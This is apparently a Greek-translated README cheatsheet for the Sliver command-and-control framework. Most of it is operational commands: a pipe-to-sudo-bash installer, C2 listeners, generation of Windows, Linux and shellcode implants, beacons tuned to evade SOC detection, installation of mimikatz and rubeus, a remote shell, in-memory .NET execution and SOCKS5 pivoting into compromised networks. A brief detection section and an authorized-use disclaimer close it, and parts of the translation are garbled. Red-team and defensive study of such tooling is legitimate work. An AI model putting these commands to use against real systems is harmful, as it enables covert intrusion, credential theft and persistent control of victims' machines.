<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Sliver C2 - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
</p>

<p align="center">
  <b>⚔️ Σύγχρονη, πολλαπλών πλατφορμών, εξομοίωση αντιπάλου ανοιχτού κώδικα και πλαίσιο Command & Control που υποστηρίζει πρωτόκολλα mTLS, WireGuard, HTTP(S) και DNS</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Επισκόπηση & Αρχιτεκτονική](#-επισκόπηση--αρχιτεκτονική)
- [Εγκατάσταση & Ρύθμιση διακομιστή](#-εγκατάσταση--ρύθμιση διακομιστή)
  - [Automated One-Liner Install](#automated-one-liner-install)
  - [Διαμόρφωση χειριστή για πολλούς παίκτες](#multiplayer-operator-configuration)
- [Διαμόρφωση ακροατή (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Δημιουργία εμφυτευμάτων (Beacons vs Sessions)](#-generating-immplants-beacons-vs-sessions)
  - [Interactive Sessions vs Asynchronous Beacons](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE & Shellcode Implants](#windows-exe--shellcode-immplants)
  - [Εμοσχεύματα ELF Linux & macOS] (#linux--macos-elf-immplants)
- [Οικοσύστημα μετά την εκμετάλλευση και οπλισμό](#-μετα-εκμετάλλευση--οπλό-οικοσύστημα)
  - [Installing Armory Extensions (BOFs, Donut, Seatbelt)] (#installing-armory-extensions-bofs-donut-seatbelt)
  - [Credential Access & Mimikatz](#credential-access--mimikatz)
  - [Pivoting & Dynamic SOCKS5](#pivoting--dynamic-socks5)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση & Αρχιτεκτονική

Σχεδιασμένο στο Go από τον **Bishop Fox**, το **Sliver** είναι μια από τις κορυφαίες εναλλακτικές λύσεις ανοιχτού κώδικα στα εμπορικά πλαίσια C2 (Cobalt Strike, Brute Ratel):
- **Cross-Platform:** Ο διακομιστής και τα εμφυτεύματα υποστηρίζουν Windows, Linux και macOS σε `x86_64`, `arm64` και `arm`.
- **Επικοινωνία αποφυγής:** Υποστήριξη εκτός συσκευασίας για αμοιβαία TLS (mTLS), σήραγγες UDP WireGuard, HTTP/HTTPS με διαδικαστική δημιουργία καναρινιών και διοχέτευση DNS.
- **Εκτέλεση στη μνήμη:** Εγγενής αντανακλαστική έγχυση DLL, αρχεία αντικειμένων Beacon (BOFs), ενσωματωμένη εκτέλεση .NET μέσω Donut και κούφωση διαδικασίας.
- **Αρχιτεκτονική πολλών παικτών:** Συνεργασία σε πραγματικό χρόνο μεταξύ πολλών χειριστών κόκκινων ομάδων μέσω κρυπτογραφικά υπογεγραμμένων προφίλ χειριστή.

---

## 📥 Εγκατάσταση & Ρύθμιση διακομιστή

### Αυτοματοποιημένη εγκατάσταση One-Liner
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Διαμόρφωση χειριστή για πολλούς παίκτες
Δημιουργήστε ένα προφίλ χειριστή στον διακομιστή C2 για ένα μέλος της ομάδας:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Διαμόρφωση ακροατή (mTLS, HTTP, WireGuard, DNS)

Μέσα στην κονσόλα `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Δημιουργία εμφυτευμάτων (Beacons vs Sessions)

### Διαδραστικές συνεδρίες έναντι ασύγχρονων φάρων
- **Περίοδος λειτουργίας:** Σύνδεση TCP/TLS σε πραγματικό χρόνο με άμεση απόκριση εντολών. Υψηλότερη ορατότητα δικτύου.
- **Beacon:** Ασύγχρονος καρδιακός παλμός που κοιμάται για διαστήματα με τυχαιοποιημένο jitter. Δραματικά πιο δύσκολο για τα SOC να εντοπιστούν μέσω ανάλυσης ανωμαλιών δικτύου.

### Εμφυτεύματα Windows EXE & Shellcode
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Εμφυτεύματα Linux & macOS ELF
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Οικοσύστημα Μετα-Εκμετάλλευσης & Οπλοφορίας

### Εγκατάσταση επεκτάσεων Armory (BOF, Donut, Ζώνη Ασφαλείας)
Το Armory είναι ο ενσωματωμένος διαχειριστής πακέτων του Sliver για επιθετικά εργαλεία τρίτων και αρχεία αντικειμένων Cobalt Strike Beacon (BOFs):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Αλληλεπίδραση με Sessions και Beacons
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### Περιστρεφόμενες & Δυναμικές ΚΑΛΤΣΕΣ5
Δρομολογήστε εξωτερικά επιθετικά εργαλεία απευθείας στο παραβιασμένο δίκτυο στόχου:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή |
|-----------|---------|
| **Έναρξη ακρόασης mTLS** | `mtls --lport 8888` |
| **Έναρξη ακρόασης HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Δημιουργία συνόδου EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Δημιουργία Beacon EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Δημιουργία Raw Shellcode** | `generate --mtls <IP>:8888 -f shellcode` |
| **Λίστα και αλληλεπίδραση περιόδων σύνδεσης**| `sessions` -> `use <ID>` |
| **Εγκατάσταση Armory Tools** | `armory install seatbelt mimikatz` |
| **Εκτέλεση .NET σε μνήμη**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Reverse Proxy** | `socks5 start --port 1080` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **JARM Fingerprinting:** Οι προεπιλεγμένοι ακροατές HTTP Sliver μπορούν να σχηματιστούν προφίλ χρησιμοποιώντας ενεργό δακτυλικό αποτύπωμα JARM TLS. Προσαρμογή κρυπτογράφησης TLS στη διαμόρφωση Sliver.
2. **YARA & Δυαδική Ανάλυση:** Τα προεπιλεγμένα εμφυτεύματα που παράγονται από την `generate` περιέχουν μεταδεδομένα Golang και δομές συμβόλων, εκτός και αν είναι ασαφής μέσω παραμόρφωσης (`--skip-symbols`).

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Sliver είναι ένα προηγμένο πλαίσιο προσομοίωσης αντιπάλου και κόκκινης ομάδας Command & Control. Πρέπει να αναπτύσσεται αποκλειστικά σε εξουσιοδοτημένες εμπλοκές με σαφείς κανόνες εμπλοκής (RoE). Η μη εξουσιοδοτημένη χρήση σε υπολογιστές τρίτων είναι αυστηρά παράνομη.